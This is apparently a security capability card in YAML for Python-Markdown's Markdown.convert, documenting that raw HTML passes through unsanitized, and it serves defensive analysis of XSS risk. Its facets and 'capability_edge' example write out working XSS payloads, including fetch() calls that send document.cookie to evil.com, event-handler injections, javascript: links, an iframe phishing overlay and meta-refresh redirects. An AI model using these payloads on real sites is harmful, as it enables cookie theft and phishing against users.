# markdown.Markdown.convert

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-c00da603ee42fe53
api: markdown.Markdown.convert
api_family: markdown.md.convert
runtime:
  language: python
  ecosystem: python-runtime
  package: markdown
  version: legacy-source-bound
capability_class: delivery-render
normative_authority: capability-facts-only
bound_sinks:
- markdown.markdown (module-level convenience function wrapping Markdown.convert)
- markdown.markdownFromFile (reads file then delegates to Markdown.convert)
roles:
- role_id: content
  description: Legacy controlled role content.
  bindings:
  - expression: text
    caller_bindable: true
facets:
- facet_id: legacy-facet-83c0a5ad
  capability: Convert arbitrary Markdown text to HTML/XHTML. The output format defaults to HTML (configurable at instance creation via output_format, but the `source` parameter alone cannot change it).
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-5b68c986
  capability: Pass through raw, unsanitized HTML embedded anywhere in the source. Standard Markdown allows inline HTML; the library retains all of it verbatim in the output. This is by design and cannot be disabled.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-78da1804
  capability: 'Embed `<script>` tags that execute JavaScript when the output is rendered in a browser. Example: `<script>alert(document.cookie)</script>` survives the conversion unchanged.'
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-0936cd14
  capability: Embed `<script src="...">` tags referencing externally-hosted JavaScript payloads.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-a3e38f16
  capability: 'Inject event-handler attributes on any HTML element: `<img src=x onerror=alert(1)>`, `<body onload=...>`, `<svg onload=...>`, `<input onfocus=... autofocus>`, `<details open ontoggle=...>`, `<marquee onstart=...>`, etc. All pass through to output.'
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-5d52f99a
  capability: Embed `<iframe>`, `<object>`, `<embed>`, `<applet>` elements referencing arbitrary URLs, enabling content inclusion, phishing overlays, or drive-by downloads.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-59ee000c
  capability: 'Inject `<style>` tags with arbitrary CSS, including CSS-based exfiltration (`background: url(...)`) and legacy expression-based script execution in old IE.'
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-803c92b0
  capability: Inject `<link>` tags for external stylesheet loading or prefetch-based tracking.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-82d2c955
  capability: Inject `<meta>` tags, including `http-equiv="refresh"` for automatic redirect to attacker-controlled URLs.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-066fbbba
  capability: Inject `<base>` tags to rebase all relative URLs in the rendered document to an attacker-controlled domain.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-c5105625
  capability: Inject `<form>` tags with `action` pointing to an attacker-controlled endpoint, enabling credential phishing when rendered.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-0ef0305b
  capability: 'Create hyperlinks with dangerous URI schemes: `javascript:`, `data:text/html`, `vbscript:` in `[text](scheme:...)` markdown link syntax or `<a href="scheme:...">` raw HTML.'
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-379f9fa2
  capability: Create images with arbitrary `src` URLs in both Markdown (`![alt](url)`) and raw HTML (`<img src="...">`), usable for tracking pixels, CSRF GET requests, or server-side request forgery if the rendering context fetches images server-side.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-6ab2c0f8
  capability: Use reference-style Markdown links/images to hide malicious URLs from casual inspection by placing them in a reference block at the bottom of the document.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-297d5a76
  capability: Embed SVG markup with inline `<script>`, `<foreignObject>`, or event handlers (`<svg onload=...>`).
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-1d5313cc
  capability: Use HTML entities and encoding tricks to obfuscate payloads (e.g., `&#x3C;script&#x3E;` in raw HTML sections), which the browser decodes at render time.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-e8187d8a
  capability: Inject HTML comments (`<!-- -->`) and legacy Internet Explorer conditional comments (`<!--[if IE]>`) that may alter parsing in targeted browsers.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-7ec4072a
  capability: Produce arbitrarily complex HTML documents by supplying a full `<html><head>...</head><body>...</body></html>` document as source, since Markdown passes through raw HTML blocks.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-64059b0f
  capability: Compose attacks across markdown block boundaries (e.g., open an HTML tag in one paragraph, close it in another) — the serialized HTML tree preserves nesting.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-47f92bba
  capability: 'Trigger `postprocessor`-level HTML injection: postprocessors operate on the already-serialized HTML string; if an extension adds a postprocessor that does string substitution without sanitization, attacker-controlled text in the source can inject HTML at that stage.'
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-74004c03
  capability: 'Exploit `treeprocessor` / `inlinepattern` behavior: extensions may parse custom inline syntax (e.g., `@@directive@@`) and substitute it into the tree or serialized output without escaping, creating extension-specific injection vectors.'
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-a9718f37
  capability: When extensions are configured on the Markdown instance (e.g., `tables`, `fenced_code`, `codehilite`, `footnotes`, `attr_list`, `admonition`), the source can trigger those extended syntax features, each of which may introduce its own rendering behaviors and HTML output.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-b030d649
  capability: 'With the `attr_list` extension enabled, attach arbitrary HTML attributes (including `on*` event handlers) to any Markdown element via `{: #id .class key="value"}` syntax.'
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
- facet_id: legacy-facet-8100fede
  capability: With the `md_in_html` extension enabled, Markdown syntax is processed inside HTML block elements, enabling nested injection where inner markdown (e.g., links with malicious schemes) is rendered inside raw HTML wrappers.
  role_ids:
  - content
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-296b68ec
  role_id: null
  value: Default output_format is 'xhtml' (or 'html' depending on version); the library produces HTML output unless explicitly configured otherwise at instance creation.
  security_effect: Default output_format is 'xhtml' (or 'html' depending on version); the library produces HTML output unless explicitly configured otherwise at instance creation.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-21be2765
  role_id: null
  value: Raw HTML is ALWAYS passed through to output. There is no built-in option, flag, or configuration key to strip or escape raw HTML in the source. The library authors explicitly document this and warn users.
  security_effect: Raw HTML is ALWAYS passed through to output. There is no built-in option, flag, or configuration key to strip or escape raw HTML in the source. The library authors explicitly document this and warn users.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-6683cf62
  role_id: null
  value: No HTML sanitization is performed at any stage of the five-step pipeline (preprocessors → BlockParser → treeprocessors/inlinepatterns → postprocessors → serialization). The output is raw, unsanitized HTML.
  security_effect: No HTML sanitization is performed at any stage of the five-step pipeline (preprocessors → BlockParser → treeprocessors/inlinepatterns → postprocessors → serialization). The output is raw, unsanitized HTML.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-5a753ec3
  role_id: null
  value: The library accepts Unicode strings and returns Unicode strings. Encoding/decoding is the caller's responsibility; binary input may produce unpredictable behavior.
  security_effect: The library accepts Unicode strings and returns Unicode strings. Encoding/decoding is the caller's responsibility; binary input may produce unpredictable behavior.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-55e270b1
  role_id: null
  value: Extension loading (if extensions are configured via the instance, not the `source` parameter) can add additional syntax rules, processors, and output formats — each extension's behavior is additive and can introduce new HTML generation paths.
  security_effect: Extension loading (if extensions are configured via the instance, not the `source` parameter) can add additional syntax rules, processors, and output formats — each extension's behavior is additive and can introduce new HTML generation paths.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-fce8a750
  role_id: null
  value: 'The full standard Markdown syntax is always available: headers, emphasis, lists, code blocks (indented and fenced), blockquotes, horizontal rules, links, images, inline code, etc. All produce their standard HTML equivalents.'
  security_effect: 'The full standard Markdown syntax is always available: headers, emphasis, lists, code blocks (indented and fenced), blockquotes, horizontal rules, links, images, inline code, etc. All produce their standard HTML equivalents.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-a2f1e99a
  role_id: null
  value: Code blocks are wrapped in `<pre><code>` by default; the content of code blocks is HTML-escaped (this is the only escaping the library performs), but raw HTML outside code blocks is untouched.
  security_effect: Code blocks are wrapped in `<pre><code>` by default; the content of code blocks is HTML-escaped (this is the only escaping the library performs), but raw HTML outside code blocks is untouched.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-1480d356
  role_id: null
  value: The library's behavior is deterministic and purely a function of `source` + the instance's configured extensions and output_format. It makes no network requests, accesses no files, and has no side effects beyond returning a string.
  security_effect: The library's behavior is deterministic and purely a function of `source` + the instance's configured extensions and output_format. It makes no network requests, accesses no files, and has no side effects beyond returning a string.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: 'import markdown


    md = markdown.Markdown()

    html = md.convert("# Hello World\n\nThis is **bold** and *italic* text.")

    print(html)

    # <h1>Hello World</h1>

    # <p>This is <strong>bold</strong> and <em>italic</em> text.</p>'
  capability_edge: 'import markdown


    md = markdown.Markdown()


    # 1) Script injection via raw HTML

    payload = "<script>fetch(''https://evil.com/steal?c=''+document.cookie)</script>"

    print(md.convert(payload))

    # <script>fetch(''https://evil.com/steal?c=''+document.cookie)</script>


    # 2) Event-handler injection

    payload = "![x](http://evil.com/x.png)\n\n<img src=x onerror=\"fetch(''https://evil.com/log'')\">"

    print(md.convert(payload))

    # <p><img alt="x" src="http://evil.com/x.png"/></p>

    # <img src="x" onerror="fetch(''https://evil.com/log'')"/>


    # 3) Markdown link with javascript: scheme

    payload = "[Click me](javascript:alert(document.domain))"

    print(md.convert(payload))

    # <p><a href="javascript:alert(document.domain)">Click me</a></p>


    # 4) Full-page phishing overlay via iframe

    payload = ''<iframe src="https://evil.com/fake-login" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999"></iframe>''

    print(md.convert(payload))

    # <iframe src="https://evil.com/fake-login" style="..."></iframe>


    # 5) SVG-based XSS

    payload = ''<svg onload="fetch(\''https://evil.com/?d=\''+btoa(document.cookie))"></svg>''

    print(md.convert(payload))

    # <svg onload="fetch(''https://evil.com/?d=''+btoa(document.cookie))"></svg>


    # 6) Meta refresh redirect

    payload = ''<meta http-equiv="refresh" content="0;url=https://evil.com/phish">''

    print(md.convert(payload))

    # <meta http-equiv="refresh" content="0;url=https://evil.com/phish"/>


    # 7) attr_list extension: attach onmouseover to a heading

    md_ext = markdown.Markdown(extensions=[''attr_list''])

    payload = "# Welcome {: onmouseover=\"fetch(''https://evil.com/log'')\" }"

    print(md_ext.convert(payload))

    # <h1 onmouseover="fetch(''https://evil.com/log'')">Welcome</h1>'
provenance:
- https://python-markdown.github.io/reference/#convert (canonical API reference)
- https://python-markdown.github.io/#library-reference (official documentation confirming no sanitization)
- 'CWE-79: Improper Neutralization of Input During Web Page Generation (''Cross-site Scripting'')'
- OWASP XSS Prevention Cheat Sheet (HTML context injection through unsanitized rendering)
- 'Python-Markdown 3.10.2 source; library docstring line: ''The Python-Markdown library does ***not*** sanitize its HTML output.'''
```
